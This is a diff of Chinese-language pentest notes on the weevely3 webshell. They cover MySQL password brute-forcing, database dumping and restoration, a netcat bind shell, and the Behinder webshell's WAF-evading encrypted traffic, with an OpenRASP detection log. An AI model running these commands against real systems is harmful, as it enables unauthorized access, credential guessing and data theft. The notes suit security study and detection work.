@@ -40,13 +40,20 @@
     * 工具命令`:bruteforce_sql mysql -hostname localhost -users root -pwds db123456 admin123` 简单枚举 成功会出现`root:pass`
     * 工具命令`:bruteforce_sql mysql -hostname localhost -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`字典枚举
   * dump数据库到本地（前提是MySQL需要权限 可导出文件到某目录）
-    * 查看MySQL权限 `show global variables like '%secure_file_priv%';` 如果查询结果为NULL 则没有权限直接使用SQL语句导入导出文件 需要变通:
-      * 把查询结果保存 ```SELECT * FROM `table1`;```  如果查询的数据量过大导致查询超时?
-        * 先确定数据条数 ```SELECT COUNT(*) FROM `table1`;``` 再分多次查询 ```SELECT * FROM `table1` ORDER BY `id` ASC LIMIT 0,20;``` 从第1条数据开始(起点) 查询得到20条数据(数据量) 下次`LIMIT 20,20`再得到20条数据 以此类推 最后拼接查询结果 得到整个表的数据
+    * 常见问题:无权限导出文件
+      * 查看MySQL权限 `show global variables like '%secure_file_priv%';` 如果查询结果为NULL 则没有权限直接使用SQL语句导入导出文件. 有变通方法
+      * 保存sql查询的结果即可 ```SELECT * FROM `table1`;```
+        * 常见问题:如果sql查询的结果数据过多 导致sql查询超时? 也有变通方法
+        * 先确定数据条数 ```SELECT COUNT(*) FROM `table1`;``` 
+        * 再分多次查询 ```SELECT * FROM `table1` ORDER BY `id` ASC LIMIT 0,20;``` 从第1条数据开始(起点) 查询得到20条数据(数据量) 下次`LIMIT 20,20`再得到20条数据 ... 以此类推 最后拼接查询结果 得到整个表的数据
     * 实现dump方式1 使用php实现(默认) 支持mysql,pgsql,sqlite,dblib  php代码见[weevely3/mysqldump.tpl](https://github.com/epinna/weevely3/blob/master/modules/sql/_dump/mysqldump.tpl) 原项目为[mysqldump-php](https://github.com/ifsnop/mysqldump-php)
     * 工具命令 `:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306` 把数据库dump 下载保存到本地目录`/var`下. 可指定保存为本地文件`-lpath /Users/xxx/Downloads/db1.sqldump`
     * 实现dump方式2 执行系统命令(只支持MySQL) 使用weevely中定义的php类`ShellCmd`执行系统命令启动`mysqldump`程序实现
     * 工具命令 `:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306 -vector mysqldump_sh`
+  * 数据复原:将得到的数据库文件`xx.sqldump`(内容为sql语句) 导入到MySQL数据库
+    * 自搭mysqld服务 并登录`mysql -u root -p`
+    * 使用MySQL命令 创建 新数据库`CREATE DATABASE new_database;`
+    * 在shell下导入数据库文件`data.sqldump`到新数据库`new_database` 命令`mysql -u username -p new_database < xx.sqldump`
 * 派生shell
   * 正向shell`:backdoor_tcp`
     * 工具命令`:backdoor_tcp 8811 -vector netcat` 在目标主机(被控端)公网IP上开启端口监听 1.1.1.1:8811   主控端执行`nc 1.1.1.1 8811`
@@ -82,7 +89,11 @@ new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder()
 
 因为冰蝎webshell使用了加密通信流量(AES双向加密)，可绕过WAF/IDS等系统
 
-检测方法:部署在web应用内部的OpenRASP能够看到后门操作日志（需安装 999-event-logger 插件）:
+检测方法:
+
+该检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)
+
+部署在web应用内部的OpenRASP能够看到后门操作日志（需安装 999-event-logger 插件）:
 ```
 [event-logger] Listing directory content: /
 [event-logger] Execute command: whoami
@@ -95,5 +106,3 @@ java.lang.ProcessBuilder.start
 net.rebeyond.behinder.payload.java.Cmd.RunCMD
 net.rebeyond.behinder.payload.java.Cmd.equals
 ```
-
-检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)
